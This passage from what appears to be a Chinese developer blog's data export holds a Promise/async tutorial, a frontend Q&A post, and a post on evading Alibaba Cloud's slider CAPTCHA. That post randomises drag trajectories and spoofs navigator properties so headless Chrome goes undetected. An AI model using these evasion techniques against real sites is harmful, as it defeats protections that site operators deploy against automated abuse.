href=\"http://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html\" target=\"_blank\" rel=\"noopener\">jQuery的deferred对象详解</a></p>\n<hr>\n<p>也许你比较傲娇不用<code>jQuery</code>，那办法还是有的，原生的<code>Promise</code>对象</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> promise = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> resolve, reject </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// ... some code</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"comment\">/* 异步操作成功 */</span>) &#123;</span><br><span class=\"line\">    resolve( value );</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    reject( error );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">promise.then( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> value </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// success</span></span><br><span class=\"line\">&#125;, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> error </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// failure</span></span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>摆脱了框架的束缚，原生写起来也是很清爽的<br>\n上面的插件ready例子就可以这样改写了</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> promise = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> resolve, reject </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// ... some code</span></span><br><span class=\"line\"></span><br><span class=\"line\">  plugin.ready( resolve );</span><br><span class=\"line\">  <span class=\"comment\">// 没有error代码的话就不用管reject</span></span><br><span class=\"line\">&#125; );</span><br><span class=\"line\">promise.then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// ... some code</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>是否会觉的有点高大上呢<br>\n忘了说<code>$.when</code>的替代，那就是<code>Promise.all</code>方法了</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> p = <span class=\"built_in\">Promise</span>.all([p1, p2, p3]);</span><br></pre></td></tr></table></figure>\n<p>这里的参数类型和<code>$.when</code>稍有不同，这里传入的是一个数组对象，那我们就不必担心不定个异步参数的问题了，若想详细了解<code>Promise</code>可移步<a href=\"http://es6.ruanyifeng.com/#docs/promise\" target=\"_blank\" rel=\"noopener\">Promise 对象</a>，嗯是的，还是阮大神的</p>\n<hr>\n<p>看到这里的同学也是挺有耐心的，最上面的回调地狱我还没有忘，一层一层的嵌套真的很烦奥，就不能让代码堵在那？像<code>alert()</code>方法一样？答案当然是：能！<br>\n于是我们的<code>async</code>函数和<code>await</code>关键字登场了（是的，又是ES6，写代码还不用ES6和咸鱼有啥区别）</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> asyncRequest = <span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> f1 = <span class=\"keyword\">await</span> $.ajax( <span class=\"string\">'/etc/fstab'</span> );</span><br><span class=\"line\">  <span class=\"keyword\">var</span> f2 = <span class=\"keyword\">await</span> $.ajax( <span class=\"string\">'/etc/shells'</span> );</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>wtf!这么简单？是的，就是这么简单，这个函数内部，就是按照你想要的、预期的、你所看到的顺序在执行，从上到下。</p>\n<p>但是这里要注意的是<code>await</code>关键字后面必须跟一个<code>Promise</code>对象，ajax返回的也行，因为js引擎在执行时还是会根据该对象的<code>then</code>方法的状态来决定下一步如何继续，并且，如果这个对象状态变更为<code>reject</code>状态或是抛出了异常，那后面的代码是不再执行的，就和普通的代码执行逻辑一样。<br>\n<code>async</code>函数还有许多用法和技巧，如果想详细了解依然可以移步阮一峰老师的<a href=\"http://es6.ruanyifeng.com/#docs/async\" target=\"_blank\" rel=\"noopener\">async 函数</a></p>\n<p>文章今天提到了<code>apply</code>函数，和其同路的还有<code>call</code>和<code>bind</code>，也许你又会说“好生僻”，可是，这都是经常用到的“神器”啊~，下一篇博文我将围绕这三个函数来讲讲他们的区别和实际使用</p>\n"},{"title":"Chrome Headless下的矛与盾","catalog":true,"date":"2018-02-10T01:50:21.000Z","subtitle":"加密与解密，攻与防，兵来将挡，水来土掩，瞬息万变的互联网无时无刻不在上演着这一幕","header-img":"post/IMG_3346.JPG","_content":"上个月刚好写了一篇[puppeteer初探](/2018/01/09/puppeteer/)，讲了一些开发中使用pupeteer进行自动化操作的东西，比如绕过一些网站的人机识别验证，自动化截图等。我们示例的是阿里云的数据风控管理平台的滑动验证，单一的滑动轨迹算法刚开始能`99%`的验证成功，但是到后面系统可能识别到一个ip反复的尝试滑动引起了注意，于是把提交过去的数据进行了汇总分析，使用了数学公式进行反向的求我们的公式（官方号称**通过生物特征判定操作计算机的是人还是机器**），于是成功率在我们的反复尝试下一直下跌直到成功率小于`1%`，具体什么公式大概能猜到，线性回归？反正我数学忘干净了（也许就没存进去过😂），那么我们使用x,y轴都随机组合（`9*9`）的算法来生成滑动轨迹，让云端的算法无法验证，那么我们就有81种可能，其实严格来说比这个更多，因为包括每一步都我们都是随机的。这样一来，成功率又达到了99%以上（无法达到100%，因为真人去滑都可能被判定失败）。\n\n可就在昨天正当我开开心心做其他事情的时候，测试那边反馈说全挂了。阿里云客户端的sdk在2018-02-09 09:23:55这个时间打包更新了。我真是*了狗了。经过我测试，在chrome受代码控制运行时，人去拉都100%失败，就是说他们知道我们处于自动测试环境，知道这个问题就简单了，我们打印了puppeteer的启动参数，发现一个叫`--enable-automation`的参数，允许自动化？干掉这个参数后再启动果然程序和人都能成功通过。\n\n不要高兴得太早，此时我们headless模式处于禁用状态，打开headless模式，成功率又退回0%，可见这次阿里云的更新就是冲着chrome的headless模式来的，甚至我怀疑就是我们的行为导致的。在和我们PM一番伸着脖子google后，发现了[Detecting Chrome Headless](http://antoinevastel.github.io/bot%20detection/2017/08/05/detect-chrome-headless.html)这篇文章，根据文中提到的方法，我进行了除了`Modernizr`这个的测试\n* User agent      这一项不用想，puppeteer api提供了修改ua的，肯定不可能是这个，false\n* Languages       我打出来是`zh-cn`，也许是chromuim更新了，false\n* WebGL           false\n* Missing image   false\n\n当我看到`Plugins`这一项时，菊花一紧，妈蛋多半是这个了，我在headless模式打出navigator.plugins.length == 0果然为true，应该是headless模式下禁用了，心想完了，无解了，浏览器属性肯定是不允许修改的。\n\n永不言弃的我们再一通google，发现了[MAKING CHROME HEADLESS UNDETECTABLE](https://intoli.com/blog/making-chrome-headless-undetectable/)和[IT IS *NOT* POSSIBLE TO DETECT AND BLOCK CHROME HEADLESS](https://intoli.com/blog/not-possible-to-block-chrome-headless/)这两篇文章，是同一个人写的。前者是检测headless模式，后者是headless模式防止被检测（我就笑笑不说话😄），后者中提到一个puppeteer的api叫`evaluateOnNewDocument`，在page这个class下，page指代标签页，看文档后我才恍然大悟，原来puppeteer的文档有描述过此类问题的处理办法，下面我将它贴出来\n> page.evaluateOnNewDocument(pageFunction, ...args)\n> * pageFunction <function|string> Function to be evaluated > in browser context\n> * ...args <...Serializable> Arguments to pass to > pageFunction\n> * returns: <Promise>\nAdds a function which would be invoked in one of the > following scenarios: \n> * whenever the page is navigated\n> * whenever the child frame is attached or navigated. In > this case, the function is invoked in the context of > the newly attached frame\n> The function is invoked after the document was created > but before any of its scripts were run. This is useful > to amend the JavaScript environment, e.g. to seed > Math.random.\n> \n> An example of overriding the navigator.languages > property before the page loads:\n```js\n// preload.js\n\n// overwrite the `languages` property to use a custom getter\nObject.defineProperty(navigator, \"languages\", {\n  get: function() {\n    return [\"en-US\", \"en\", \"bn\"];\n  };\n});\n\n// In your puppeteer script, assuming the preload.js file is in same folder of our script\nconst preloadFile = fs.readFileSync('./preload.js', 'utf8');\nawait page.evaluateOnNewDocument(preloadFile);\n```\n在dom生成或插入前，我们重写navigator下的languages属性的getter，`defineProperty`这个api是ES5加入的，目前pupeteer提供的Chromuim的版本也不用担心兼容问题。讲道理，我感觉这是浏览器的bug，曲线修改系统属性？也不管了，我照着文档里提到的几个属性把它们的getter都重写了，虽然文档描述的这个api更像是一个事件（The function is invoked after the document was created but before any of its scripts were run. ）,但是我们还是将这些代码放到了page.goto之前，懒得再去试放到后面行不行。\n\n在这一些准备好后，我们开启了headless模式，结果在意料之中，问题便由此解决，也不知道阿里云下次更新后，这个办法会不会被封掉，等他们封掉后也许Chromuim和puppeteer又更新了😊。","source":"_posts/chrome-headless-spear-and-shield.md","raw":"---\ntitle: Chrome Headless下的矛与盾\ncatalog: true\ndate: 2018-02-10 09:50:21\nsubtitle: 加密与解密，攻与防，兵来将挡，水来土掩，瞬息万变的互联网无时无刻不在上演着这一幕\nheader-img: post/IMG_3346.JPG\ntags:\n- headless\n- chrome\n- puppeteer\n---\n上个月刚好写了一篇[puppeteer初探](/2018/01/09/puppeteer/)，讲了一些开发中使用pupeteer进行自动化操作的东西，比如绕过一些网站的人机识别验证，自动化截图等。我们示例的是阿里云的数据风控管理平台的滑动验证，单一的滑动轨迹算法刚开始能`99%`的验证成功，但是到后面系统可能识别到一个ip反复的尝试滑动引起了注意，于是把提交过去的数据进行了汇总分析，使用了数学公式进行反向的求我们的公式（官方号称**通过生物特征判定操作计算机的是人还是机器**），于是成功率在我们的反复尝试下一直下跌直到成功率小于`1%`，具体什么公式大概能猜到，线性回归？反正我数学忘干净了（也许就没存进去过😂），那么我们使用x,y轴都随机组合（`9*9`）的算法来生成滑动轨迹，让云端的算法无法验证，那么我们就有81种可能，其实严格来说比这个更多，因为包括每一步都我们都是随机的。这样一来，成功率又达到了99%以上（无法达到100%，因为真人去滑都可能被判定失败）。\n\n可就在昨天正当我开开心心做其他事情的时候，测试那边反馈说全挂了。阿里云客户端的sdk在2018-02-09 09:23:55这个时间打包更新了。我真是*了狗了。经过我测试，在chrome受代码控制运行时，人去拉都100%失败，就是说他们知道我们处于自动测试环境，知道这个问题就简单了，我们打印了puppeteer的启动参数，发现一个叫`--enable-automation`的参数，允许自动化？干掉这个参数后再启动果然程序和人都能成功通过。\n\n不要高兴得太早，此时我们headless模式处于禁用状态，打开headless模式，成功率又退回0%，可见这次阿里云的更新就是冲着chrome的headless模式来的，甚至我怀疑就是我们的行为导致的。在和我们PM一番伸着脖子google后，发现了[Detecting Chrome Headless](http://antoinevastel.github.io/bot%20detection/2017/08/05/detect-chrome-headless.html)这篇文章，根据文中提到的方法，我进行了除了`Modernizr`这个的测试\n* User agent      这一项不用想，puppeteer api提供了修改ua的，肯定不可能是这个，false\n* Languages       我打出来是`zh-cn`，也许是chromuim更新了，false\n* WebGL           false\n* Missing image   false\n\n当我看到`Plugins`这一项时，菊花一紧，妈蛋多半是这个了，我在headless模式打出navigator.plugins.length == 0果然为true，应该是headless模式下禁用了，心想完了，无解了，浏览器属性肯定是不允许修改的。\n\n永不言弃的我们再一通google，发现了[MAKING CHROME HEADLESS UNDETECTABLE](https://intoli.com/blog/making-chrome-headless-undetectable/)和[IT IS *NOT* POSSIBLE TO DETECT AND BLOCK CHROME HEADLESS](https://intoli.com/blog/not-possible-to-block-chrome-headless/)这两篇文章，是同一个人写的。前者是检测headless模式，后者是headless模式防止被检测（我就笑笑不说话😄），后者中提到一个puppeteer的api叫`evaluateOnNewDocument`，在page这个class下，page指代标签页，看文档后我才恍然大悟，原来puppeteer的文档有描述过此类问题的处理办法，下面我将它贴出来\n> page.evaluateOnNewDocument(pageFunction, ...args)\n> * pageFunction <function|string> Function to be evaluated > in browser context\n> * ...args <...Serializable> Arguments to pass to > pageFunction\n> * returns: <Promise>\nAdds a function which would be invoked in one of the > following scenarios: \n> * whenever the page is navigated\n> * whenever the child frame is attached or navigated. In > this case, the function is invoked in the context of > the newly attached frame\n> The function is invoked after the document was created > but before any of its scripts were run. This is useful > to amend the JavaScript environment, e.g. to seed > Math.random.\n> \n> An example of overriding the navigator.languages > property before the page loads:\n```js\n// preload.js\n\n// overwrite the `languages` property to use a custom getter\nObject.defineProperty(navigator, \"languages\", {\n  get: function() {\n    return [\"en-US\", \"en\", \"bn\"];\n  };\n});\n\n// In your puppeteer script, assuming the preload.js file is in same folder of our script\nconst preloadFile = fs.readFileSync('./preload.js', 'utf8');\nawait page.evaluateOnNewDocument(preloadFile);\n```\n在dom生成或插入前，我们重写navigator下的languages属性的getter，`defineProperty`这个api是ES5加入的，目前pupeteer提供的Chromuim的版本也不用担心兼容问题。讲道理，我感觉这是浏览器的bug，曲线修改系统属性？也不管了，我照着文档里提到的几个属性把它们的getter都重写了，虽然文档描述的这个api更像是一个事件（The function is invoked after the document was created but before any of its scripts were run. ）,但是我们还是将这些代码放到了page.goto之前，懒得再去试放到后面行不行。\n\n在这一些准备好后，我们开启了headless模式，结果在意料之中，问题便由此解决，也不知道阿里云下次更新后，这个办法会不会被封掉，等他们封掉后也许Chromuim和puppeteer又更新了😊。","slug":"chrome-headless-spear-and-shield","published":1,"updated":"2018-02-10T03:16:25.986Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjvl0008i4uc6o76pynx","content":"<p>上个月刚好写了一篇<a href=\"/2018/01/09/puppeteer/\">puppeteer初探</a>，讲了一些开发中使用pupeteer进行自动化操作的东西，比如绕过一些网站的人机识别验证，自动化截图等。我们示例的是阿里云的数据风控管理平台的滑动验证，单一的滑动轨迹算法刚开始能<code>99%</code>的验证成功，但是到后面系统可能识别到一个ip反复的尝试滑动引起了注意，于是把提交过去的数据进行了汇总分析，使用了数学公式进行反向的求我们的公式（官方号称<strong>通过生物特征判定操作计算机的是人还是机器</strong>），于是成功率在我们的反复尝试下一直下跌直到成功率小于<code>1%</code>，具体什么公式大概能猜到，线性回归？反正我数学忘干净了（也许就没存进去过😂），那么我们使用x,y轴都随机组合（<code>9*9</code>）的算法来生成滑动轨迹，让云端的算法无法验证，那么我们就有81种可能，其实严格来说比这个更多，因为包括每一步都我们都是随机的。这样一来，成功率又达到了99%以上（无法达到100%，因为真人去滑都可能被判定失败）。</p>\n<p>可就在昨天正当我开开心心做其他事情的时候，测试那边反馈说全挂了。阿里云客户端的sdk在2018-02-09 09:23:55这个时间打包更新了。我真是*了狗了。经过我测试，在chrome受代码控制运行时，人去拉都100%失败，就是说他们知道我们处于自动测试环境，知道这个问题就简单了，我们打印了puppeteer的启动参数，发现一个叫<code>--enable-automation</code>的参数，允许自动化？干掉这个参数后再启动果然程序和人都能成功通过。</p>\n<p>不要高兴得太早，此时我们headless模式处于禁用状态，打开headless模式，成功率又退回0%，可见这次阿里云的更新就是冲着chrome的headless模式来的，甚至我怀疑就是我们的行为导致的。在和我们PM一番伸着脖子google后，发现了<a href=\"http://antoinevastel.github.io/bot%20detection/2017/08/05/detect-chrome-headless.html\" target=\"_blank\" rel=\"noopener\">Detecting Chrome Headless</a>这篇文章，根据文中提到的方法，我进行了除了<code>Modernizr</code>这个的测试</p>\n<ul>\n<li>User agent      这一项不用想，puppeteer api提供了修改ua的，肯定不可能是这个，false</li>\n<li>Languages       我打出来是<code>zh-cn</code>，也许是chromuim更新了，false</li>\n<li>WebGL           false</li>\n<li>Missing image   false</li>\n</ul>\n<p>当我看到<code>Plugins</code>这一项时，菊花一紧，妈蛋多半是这个了，我在headless模式打出navigator.plugins.length == 0果然为true，应该是headless模式下禁用了，心想完了，无解了，浏览器属性肯定是不允许修改的。</p>\n<p>永不言弃的我们再一通google，发现了<a href=\"https://intoli.com/blog/making-chrome-headless-undetectable/\" target=\"_blank\" rel=\"noopener\">MAKING CHROME HEADLESS UNDETECTABLE</a>和<a href=\"https://intoli.com/blog/not-possible-to-block-chrome-headless/\" target=\"_blank\" rel=\"noopener\">IT IS <em>NOT</em> POSSIBLE TO DETECT AND BLOCK CHROME HEADLESS</a>这两篇文章，是同一个人写的。前者是检测headless模式，后者是headless模式防止被检测（我就笑笑不说话😄），后者中提到一个puppeteer的api叫<code>evaluateOnNewDocument</code>，在page这个class下，page指代标签页，看文档后我才恍然大悟，原来puppeteer的文档有描述过此类问题的处理办法，下面我将它贴出来</p>\n<blockquote>\n<p>page.evaluateOnNewDocument(pageFunction, …args)</p>\n<ul>\n<li>pageFunction &lt;function|string&gt; Function to be evaluated &gt; in browser context</li>\n<li>…args &lt;…Serializable&gt; Arguments to pass to &gt; pageFunction</li>\n<li>returns: <promise><br>\nAdds a function which would be invoked in one of the &gt; following scenarios:</promise></li>\n<li>whenever the page is navigated</li>\n<li>whenever the child frame is attached or navigated. In &gt; this case, the function is invoked in the context of &gt; the newly attached frame<br>\nThe function is invoked after the document was created &gt; but before any of its scripts were run. This is useful &gt; to amend the JavaScript environment, e.g. to seed &gt; Math.random.</li>\n</ul>\n<p>An example of overriding the navigator.languages &gt; property before the page loads:</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// preload.js</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// overwrite the `languages` property to use a custom getter</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(navigator, <span class=\"string\">\"languages\"</span>, &#123;</span><br><span class=\"line\">  get: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [<span class=\"string\">\"en-US\"</span>, <span class=\"string\">\"en\"</span>, <span class=\"string\">\"bn\"</span>];</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// In your puppeteer script, assuming the preload.js file is in same folder of our script</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> preloadFile = fs.readFileSync(<span class=\"string\">'./preload.js'</span>, <span class=\"string\">'utf8'</span>);</span><br><span class=\"line\"><span class=\"keyword\">await</span> page.evaluateOnNewDocument(preloadFile);</span><br></pre></td></tr></table></figure>\n<p>在dom生成或插入前，我们重写navigator下的languages属性的getter，<code>defineProperty</code>这个api是ES5加入的，目前pupeteer提供的Chromuim的版本也不用担心兼容问题。讲道理，我感觉这是浏览器的bug，曲线修改系统属性？也不管了，我照着文档里提到的几个属性把它们的getter都重写了，虽然文档描述的这个api更像是一个事件（The function is invoked after the document was created but before any of its scripts were run. ）,但是我们还是将这些代码放到了page.goto之前，懒得再去试放到后面行不行。</p>\n<p>在这一些准备好后，我们开启了headless模式，结果在意料之中，问题便由此解决，也不知道阿里云下次更新后，这个办法会不会被封掉，等他们封掉后也许Chromuim和puppeteer又更新了😊。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>上个月刚好写了一篇<a href=\"/2018/01/09/puppeteer/\">puppeteer初探</a>，讲了一些开发中使用pupeteer进行自动化操作的东西，比如绕过一些网站的人机识别验证，自动化截图等。我们示例的是阿里云的数据风控管理平台的滑动验证，单一的滑动轨迹算法刚开始能<code>99%</code>的验证成功，但是到后面系统可能识别到一个ip反复的尝试滑动引起了注意，于是把提交过去的数据进行了汇总分析，使用了数学公式进行反向的求我们的公式（官方号称<strong>通过生物特征判定操作计算机的是人还是机器</strong>），于是成功率在我们的反复尝试下一直下跌直到成功率小于<code>1%</code>，具体什么公式大概能猜到，线性回归？反正我数学忘干净了（也许就没存进去过😂），那么我们使用x,y轴都随机组合（<code>9*9</code>）的算法来生成滑动轨迹，让云端的算法无法验证，那么我们就有81种可能，其实严格来说比这个更多，因为包括每一步都我们都是随机的。这样一来，成功率又达到了99%以上（无法达到100%，因为真人去滑都可能被判定失败）。</p>\n<p>可就在昨天正当我开开心心做其他事情的时候，测试那边反馈说全挂了。阿里云客户端的sdk在2018-02-09 09:23:55这个时间打包更新了。我真是*了狗了。经过我测试，在chrome受代码控制运行时，人去拉都100%失败，就是说他们知道我们处于自动测试环境，知道这个问题就简单了，我们打印了puppeteer的启动参数，发现一个叫<code>--enable-automation</code>的参数，允许自动化？干掉这个参数后再启动果然程序和人都能成功通过。</p>\n<p>不要高兴得太早，此时我们headless模式处于禁用状态，打开headless模式，成功率又退回0%，可见这次阿里云的更新就是冲着chrome的headless模式来的，甚至我怀疑就是我们的行为导致的。在和我们PM一番伸着脖子google后，发现了<a href=\"http://antoinevastel.github.io/bot%20detection/2017/08/05/detect-chrome-headless.html\" target=\"_blank\" rel=\"noopener\">Detecting Chrome Headless</a>这篇文章，根据文中提到的方法，我进行了除了<code>Modernizr</code>这个的测试</p>\n<ul>\n<li>User agent      这一项不用想，puppeteer api提供了修改ua的，肯定不可能是这个，false</li>\n<li>Languages       我打出来是<code>zh-cn</code>，也许是chromuim更新了，false</li>\n<li>WebGL           false</li>\n<li>Missing image   false</li>\n</ul>\n<p>当我看到<code>Plugins</code>这一项时，菊花一紧，妈蛋多半是这个了，我在headless模式打出navigator.plugins.length == 0果然为true，应该是headless模式下禁用了，心想完了，无解了，浏览器属性肯定是不允许修改的。</p>\n<p>永不言弃的我们再一通google，发现了<a href=\"https://intoli.com/blog/making-chrome-headless-undetectable/\" target=\"_blank\" rel=\"noopener\">MAKING CHROME HEADLESS UNDETECTABLE</a>和<a href=\"https://intoli.com/blog/not-possible-to-block-chrome-headless/\" target=\"_blank\" rel=\"noopener\">IT IS <em>NOT</em> POSSIBLE TO DETECT AND BLOCK CHROME HEADLESS</a>这两篇文章，是同一个人写的。前者是检测headless模式，后者是headless模式防止被检测（我就笑笑不说话😄），后者中提到一个puppeteer的api叫<code>evaluateOnNewDocument</code>，在page这个class下，page指代标签页，看文档后我才恍然大悟，原来puppeteer的文档有描述过此类问题的处理办法，下面我将它贴出来</p>\n<blockquote>\n<p>page.evaluateOnNewDocument(pageFunction, …args)</p>\n<ul>\n<li>pageFunction &lt;function|string&gt; Function to be evaluated &gt; in browser context</li>\n<li>…args &lt;…Serializable&gt; Arguments to pass to &gt; pageFunction</li>\n<li>returns: <promise><br>\nAdds a function which would be invoked in one of the &gt; following scenarios:</promise></li>\n<li>whenever the page is navigated</li>\n<li>whenever the child frame is attached or navigated. In &gt; this case, the function is invoked in the context of &gt; the newly attached frame<br>\nThe function is invoked after the document was created &gt; but before any of its scripts were run. This is useful &gt; to amend the JavaScript environment, e.g. to seed &gt; Math.random.</li>\n</ul>\n<p>An example of overriding the navigator.languages &gt; property before the page loads:</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// preload.js</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// overwrite the `languages` property to use a custom getter</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(navigator, <span class=\"string\">\"languages\"</span>, &#123;</span><br><span class=\"line\">  get: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [<span class=\"string\">\"en-US\"</span>, <span class=\"string\">\"en\"</span>, <span class=\"string\">\"bn\"</span>];</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// In your puppeteer script, assuming the preload.js file is in same folder of our script</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> preloadFile = fs.readFileSync(<span class=\"string\">'./preload.js'</span>, <span class=\"string\">'utf8'</span>);</span><br><span class=\"line\"><span class=\"keyword\">await</span> page.evaluateOnNewDocument(preloadFile);</span><br></pre></td></tr></table></figure>\n<p>在dom生成或插入前，我们重写navigator下的languages属性的getter，<code>defineProperty</code>这个api是ES5加入的，目前pupeteer提供的Chromuim的版本也不用担心兼容问题。讲道理，我感觉这是浏览器的bug，曲线修改系统属性？也不管了，我照着文档里提到的几个属性把它们的getter都重写了，虽然文档描述的这个api更像是一个事件（The function is invoked after the document was created but before any of its scripts were run. ）,但是我们还是将这些代码放到了page.goto之前，懒得再去试放到后面行不行。</p>\n<p>在这一些准备好后，我们开启了headless模式，结果在意料之中，问题便由此解决，也不知道阿里云下次更新后，这个办法会不会被封掉，等他们封掉后也许Chromuim和puppeteer又更新了😊。</p>\n"},{"title":"前端疑难问题整理","catalog":true,"date":"2018-02-27T08:22:04.000Z","subtitle":null,"header-img":"post/IMG_2616.JPG","_content":"# javascript篇\n## prototype和__proto__的关系是什么\n先看一段代码\n```js\nfunction Person( name, age ) { \n  this.name = name;\n  this.age = age;\n}\nvar p = new Person( 'xiaoming', 19 );\nconsole.log( p.__proto__ == Person.prototype );\n// true\n```\n`__proto__`是每个对象都有的一个属性，而`prototype`是函数才会有的属性，查找资料后是这么描述`__proto__`的：\n> 对象具有属性`__proto__`，可称为隐式原型，一个对象的隐式原型指向构造该对象的构造函数的原型，这也保证了实例能够访问在构造函数原型中定义的属性和方法。\n\n而`prototype`是这么描述的\n> 方法(Function)这个特殊的对象，除了和其他对象一样有上述__proto__属性之外，还有自己特有的属性——原型属性（prototype），这个属性是一个指针，指向一个对象，这个对象的用途就是包含所有实例共享的属性和方法（我们把这个对象叫做原型对象）。原型对象也有一个属性，叫做constructor，这个属性包含了一个指针，指回原构造函数。\n\n用一张简单的图就能概括二者关系\n![示例](20180228144215.jpg)\n\n## JavaScript 异步、栈、事件循环、任务队列\n嗯，还是开局一张图\n![示例](4020255170-59bc9e1671029_articlex.png)\n有这么一段代码\n```js\nfunction bar() {\n  console.log(1);\n}\n\nfunction foo() {\n  console.log(2);\n  bar();\n}\n\nsetTimeout(() => {\n    console.log(3)\n});\n\nfoo();\n```\n它在栈中的入栈、出栈过程，如下图：\n![示例](1021884518-59bc9e30d414a_articlex.png)\n\n看到这里，我就联想到了平时使用浏览器的debug功能的时候，在断点处停住时能看到的`call stack`。\n这里我们有个概念叫**任务队列**，js中，有两类任务队列：宏任务队列（macro tasks）和微任务队列（micro tasks）。宏任务队列可以有多个，微任务队列只有一个。下面是常见的一些任务的任务队列：\n* 宏任务：script（全局任务）, setTimeout, setInterval, setImmediate, I/O, UI rendering.\n* 微任务：process.nextTick, Promise, Object.observer, MutationObserver.\n比如有这样的代码\n```js\nsetTimeout(function() {\n    console.log('timeout1');\n})\n\nnew Promise(function(resolve) {\n    console.log('promise1');\n    for(var i = 0; i < 1000; i++) {\n        i == 99 && resolve();\n    }\n    console.log('promise2');\n}).then(function() {\n    console.log('then1');\n})\n\nconsole.log('global1');\n```\n比如上面这样的一段代码，`setTimeout`是一个宏任务源，所以里面的回调函数`console.log('timeout1')`会被加到宏任务队列中。到了Promise，输出promise1以及promise2，for循环内执行resolve时，由于Promise是一个微任务源，所以`console.log('then1')`回调会被加到微任务队列中。继续执行代码，输出grobal1。这个时候，执行栈上的代码已经执行完毕，所以此时我们执行微任务队列，此时的微任务队列上有`console.log('then1')`，所以浏览器输出then1。至此，一轮的事件循环已经执行完毕，开启新的一轮事件循环。也是从`宏任务->执行栈->微任务`。由于此时宏任务上有事件`console.log('timeout1')`，所以输出timeout1。这就是整段代码执行情况的理解。依次输出如下：\n```js\npromise1\npromise2\nglobal1\nthen1\ntimeout1\n```\n\n### nodejs中的process.nextTick和setImmediate\n```js\nprocess.nextTick(function A() {\n  console.log(1);\n  process.nextTick(function B(){console.log(2);});\n});\n\nsetTimeout(function timeout() {\n  console.log('TIMEOUT FIRED');\n}, 0)\n// 1\n// 2\n// TIMEOUT 